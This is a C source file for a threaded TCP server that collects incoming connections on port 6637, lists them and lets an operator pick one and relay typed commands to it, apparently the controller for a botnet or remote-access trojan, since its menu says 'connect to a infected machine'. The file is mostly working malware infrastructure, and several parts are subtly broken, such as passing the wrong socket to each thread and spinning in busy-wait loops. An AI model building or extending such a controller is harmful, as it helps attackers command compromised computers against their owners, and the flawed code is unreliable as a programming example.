#include <sys/types.h>
#include <sys/socket.h>
#include <stdio.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/shm.h>
#include <pthread.h>


/********************  Method stubs  ***************************/
//Build the cmd controller
void initCmdController(void);
//Listen to the port, and get the connection
int initPortListener(void);
void controlThread(int conn);
//Start a new thread to listen socket request.
void initSocketServer(void);
//Close the controller
int closeConnections(void);

//Command implementation
void doConnect(char *cmd);
void doList(void);
void doSend(int conn);

//Command cut(eg, cut "connect 127.0.0.1" to "127.0.0.1")
char *cmdCut(char *cmd, int start);
//If error then exit
void exitIfError(int rv);

/********************  Globle variables  ***************************/
#define SP_PORT  6637
#define QUEUE   20
#define BUFFER_SIZE 1024
int runable;                    //To stop the port listener.
int conns[256];                 //Maximum 256 client connections
struct sockaddr_in addrs[256];  //The address for each socket connection
int connnum;                    //Connection numbers
int currentConn;                //Current connection
int server_sockfd;              //Server socket
int threadFlag;                 //A thread flag to define which thread get the input
pthread_attr_t attr;            //Pthread attribute

int main()
{
    initPortListener();
    initSocketServer();
}

void initSocketServer(void){
    int rv;
    struct sockaddr_in server_sockaddr;
    server_sockaddr.sin_family = AF_INET;
    server_sockaddr.sin_port = htons(SP_PORT);
    server_sockaddr.sin_addr.s_addr = htonl(INADDR_ANY); 
    socklen_t length = sizeof(server_sockaddr);
    
    pthread_t tid;
    pthread_attr_t attr;
    pthread_attr_init(&attr);
    pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);
    
    server_sockfd = socket(AF_INET,SOCK_STREAM, 0);
    rv = bind(server_sockfd,(struct sockaddr *)&server_sockaddr,sizeof(server_sockaddr));
    exitIfError(listen(server_sockfd,QUEUE));
    runable = 1;
    connnum = 0;
    currentConn = -1;
    threadFlag = 0;
    
    while(runable){
        conns[connnum] = accept(server_sockfd, (struct sockaddr*)&addrs[connnum], &length);
        exitIfError(conns[connnum]);
        printf("get a new connection from %s:%d\n $ ", 
            inet_ntoa(addrs[connnum].sin_addr), 
            addrs[connnum].sin_port);
        connnum++;
        rv=pthread_create(&tid, &attr, (void*)controlThread, conns[connnum]);
    }
    close(server_sockfd);
}

int initPortListener(void){
    pthread_t tid;
    pthread_attr_t attr;
    int rv;
    
    pthread_attr_init(&attr);
    pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);
    rv=pthread_create(&tid, &attr, (void*)initCmdController, NULL);
    
    return rv;
}

void controlThread(int conn){
    char cmd[BUFFER_SIZE];
    
    while(runable){
        while(runable && conn != currentConn);
        
        printf("Yes, in this thread now\n");
        while (fgets(cmd, sizeof(cmd), stdin) != NULL){
            if(strcmp(cmd, "send\n") == 0) {
                doSend(conn);
                break;
            } 
            printf("$ ");
        }
        threadFlag = 0;
    }
}

void initCmdController(void){
    char cmd[BUFFER_SIZE];
    
    printf("Command includes:\n1.[connect ip]connect to a infected machine\n$ ");
    while (fgets(cmd, sizeof(cmd), stdin) != NULL){
        if(strcmp(cmd, "exit\n") == 0) {
            break;
        } 
        if(strncmp(cmd, "connect", 7) == 0) doConnect(cmdCut(cmd, 7));
        else if(strncmp(cmd, "list", 4) == 0) doList();
        
        while(threadFlag);
        printf("$ ");
    }
}

void exitIfError(int rv){
    if(rv < 0){
        printf("Error exit %d\n", rv);
        exit(1);
    }
}

void doConnect(char *cmd){
    int i;
    char *addr;
    for(i=0; i<connnum; i++){
        addr = inet_ntoa(addrs[i].sin_addr);
        if(strncmp(addr, cmd, strlen(addr)) == 0){
            threadFlag = 1;
            currentConn = i;
            printf("Connect success!\n");
            break;
        }
    }
}

void doSend(int conn){
    char sendbuf[BUFFER_SIZE];
    char recvbuf[BUFFER_SIZE];
    int rv;
    
    printf("I am doing send\n");
    while (fgets(sendbuf, sizeof(sendbuf), stdin) != NULL)
    {
        printf("Sendbuf %s\n", sendbuf);
        if(strcmp(sendbuf,"exit\n")==0)
            break;
        rv = send(conn, sendbuf, strlen(sendbuf),0); 
        printf("Return value is %d", rv);
        rv = recv(conn, recvbuf, sizeof(recvbuf),0);
        printf("Return value is %d", rv);
        fputs(recvbuf, stdout);

        memset(sendbuf, 0, sizeof(sendbuf));
        memset(recvbuf, 0, sizeof(recvbuf));
    }
}

void doList(){
    int i;
    for(i=0; i<connnum; i++){
        printf("[Machine %d] %s:%d\n", i+1, inet_ntoa(addrs[i].sin_addr), addrs[i].sin_port);
    }
}

char *cmdCut(char *cmd, int start){
    cmd+=start;
    while(*cmd == ' ') cmd++;
    return cmd;
}

/*
void thread(int conn)
{
    char buffer[BUFFER_SIZE];
　　 while(1)
    {
        memset(buffer,0,sizeof(buffer));
        int len = recv(conn, buffer, sizeof(buffer),0);
        if(strcmp(buffer,"exit\n")==0)
            break;
        if(strcmp(buffer,"exit0\n")==0){
            runable = 0;
            break;
        }
        fputs(buffer, stdout);
        send(conn, buffer, len, 0);
    }
    close(conn);
}
*/